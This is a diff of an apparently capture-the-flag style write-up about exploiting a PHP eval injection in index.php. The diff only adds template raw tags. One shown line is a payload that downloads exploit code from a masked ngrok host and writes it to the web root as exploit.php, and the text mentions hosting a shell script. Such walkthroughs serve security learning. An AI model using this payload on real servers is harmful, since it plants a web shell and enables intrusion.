@@ -21,7 +21,7 @@ Snipped code from: index.php (Only PHP Part !)
 
 The 7th line of the code appears to contain an `eval` function that is called within the `do_calcs` function. 
 This function is called in line 17 of the code. Before we can examine this further, we need to check the 4th line of the code, which appears to contain a regular expression pattern. 
-This suggests that our PHP code must be placed within `{{PHP EVAL CODE}}` in order to be evaluated properly.
+This suggests that our PHP code must be placed within {% raw %}`{{PHP EVAL CODE}}`{% endraw %} in order to be evaluated properly.
 
 ![code](https://user-images.githubusercontent.com/84577967/174358220-78ffee4d-d1ee-49f5-a2c8-4b474068e8b5.png)
 
@@ -58,9 +58,11 @@ The shell.sh content:
 
 Now that we have saved the shell, we can host it on a local web server using PHP or Python.
 
+{% raw %}
 ```
 200,{{file_put_contents("/var/www/html/exploit.php",file_get_contents("http://XXXXXXXXX.ngrok.io/exploit.txt"),FILE_APPEND)}}
 ```
+{% endraw %}
 
 ![payload](https://user-images.githubusercontent.com/84577967/174358048-7ea473ea-06b6-407b-9f1e-e89ff5b433ad.png)
 
